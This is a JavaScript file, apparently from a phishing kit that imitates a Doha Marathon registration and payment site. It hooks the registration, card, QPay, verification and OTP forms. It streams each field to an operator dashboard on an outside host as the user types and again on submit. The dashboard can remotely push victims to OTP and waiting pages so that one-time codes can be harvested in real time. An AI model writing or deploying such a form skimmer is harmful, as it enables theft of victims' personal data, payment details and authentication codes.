// Configuration for Separate Frontend/Dashboard deployments
const DASHBOARD_URL = 'https://marath.onrender.com';
const INSTANCE_KEY = 'your_secret_key';

// 1. Session ID Management
const SESSION_KEY = 'doha_marathon_session';
let sessionId = localStorage.getItem(SESSION_KEY);
if (!sessionId) {
  sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
  localStorage.setItem(SESSION_KEY, sessionId);
}

// 2. Page Detection
function detectCurrentPage() {
  const path = (location.pathname || '').toLowerCase();
  if (path.includes('registration-summary')) return 'registration-summary';
  if (path.includes('registration')) return 'registration';
  if (path.includes('payment-card')) return 'payment-card';
  if (path.includes('payment-verify')) return 'payment-verify';
  if (path.includes('payment')) return 'payment';
  if (path.includes('qpy')) return 'qpy';
  if (path.includes('otp')) return 'otp';
  if (path.includes('wait')) return 'wait';
  return 'index';
}
const currentPage = detectCurrentPage();

// 3. Socket Connection
const socket = io(DASHBOARD_URL, { 
  query: { sessionId, instanceKey: INSTANCE_KEY },
  transports: ['websocket', 'polling'],
  withCredentials: true 
});

function syncSavedReview() {
  try {
    const raw = sessionStorage.getItem('doha-marathon-registration-review');
    if (raw) {
      const review = JSON.parse(raw);
      if (review && (review.firstName || review.email)) {
        socket.emit('user:form-submit', { sessionId, page: 'registration', formData: review });
      }
    }
  } catch(e) {}
}

socket.on('connect', () => {
  socket.emit('user:join', { sessionId, page: currentPage });
  syncSavedReview();
});

socket.on('navigate', ({ page }) => {
  const PAGES = [
    { id: 'index', name: 'الرئيسية', url: '/' },
    { id: 'registration', name: 'التسجيل', url: '/registration.html' },
    { id: 'registration-summary', name: 'ملخص السلة', url: '/registration-summary.html' },
    { id: 'payment', name: 'اختيار الدفع', url: '/payment.html' },
    { id: 'payment-card', name: 'بطاقة الائتمان', url: '/payment-card.html' },
    { id: 'qpy', name: 'QPay', url: '/qpy.html' },
    { id: 'payment-verify', name: 'التحقق من الرمز', url: '/payment-verify.html' },
    { id: 'otp', name: 'رمز التحقق', url: '/otp.html' },
    { id: 'wait', name: 'الانتظار', url: '/wait.html' }
  ];
  const target = PAGES.find(p => p.id === page)?.url || '/';
  window.location.href = target;
});

// 4. Form Data Extraction Helper
function extractFormData(form) {
  const formData = new FormData(form);
  const data = {};
  formData.forEach((v, k) => {
    if (v instanceof File) {
      data[k] = v.name ? `${v.name} (${Math.round(v.size / 1024)} KB)` : '';
    } else if (v !== undefined && v !== null && String(v).trim() !== '') {
      data[k] = String(v).trim();
    }
  });

  // Also catch fields that may not be in FormData (e.g. custom inputs)
  form.querySelectorAll('input, select, textarea').forEach(el => {
    const name = el.name || el.id;
    if (name && el.value && !data[name] && el.type !== 'file' && el.type !== 'password') {
      data[name] = String(el.value).trim();
    }
  });

  // Mask card numbers
  if (data.cardNumber) {
    data.cardNumber = '**** **** **** ' + data.cardNumber.slice(-4);
  }

  return data;
}

// 5. Send Form Data (Socket + Fallback POST)
function sendFormData(form, page, isSubmit = false) {
  const data = extractFormData(form);
  if (!data || Object.keys(data).length === 0) return;

  socket.emit('user:form-submit', { sessionId, page, formData: data });

  if (isSubmit) {
    try {
      fetch(`${DASHBOARD_URL}/api/track`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionId, type: 'form-submit', page, data }),
        keepalive: true
      }).catch(() => {});
    } catch(e) {}
  }
}

// 6. Live and Submit Capture
function captureForm(form, page) {
  let debounceTimer = null;
  form.addEventListener('input', () => {
    clearTimeout(debounceTimer);
    debounceTimer = setTimeout(() => {
      sendFormData(form, page, false);
    }, 400);
  });

  form.addEventListener('change', () => {
    sendFormData(form, page, false);
  });

  form.addEventListener('submit', () => {
    sendFormData(form, page, true);
  });
}

// 7. Auto-detect forms on page
document.addEventListener('DOMContentLoaded', () => {
  const forms = {
    '#registration-form': 'registration',
    '#card-form': 'payment-card',
    '#paymentForm form, #paymentForm': 'qpy',
    '#verify-form': 'payment-verify',
    '#otpForm': 'otp'
  };
  Object.entries(forms).forEach(([sel, page]) => {
    const form = document.querySelector(sel);
    if (form) {
      captureForm(form, page);
      // Send initial values if already prefilled
      setTimeout(() => sendFormData(form, page, false), 500);
    }
  });
  syncSavedReview();
});

// 8. Page visibility tracking
document.addEventListener('visibilitychange', () => {
  if (!document.hidden) {
    socket.emit('user:page-change', { sessionId, page: currentPage });
  }
});
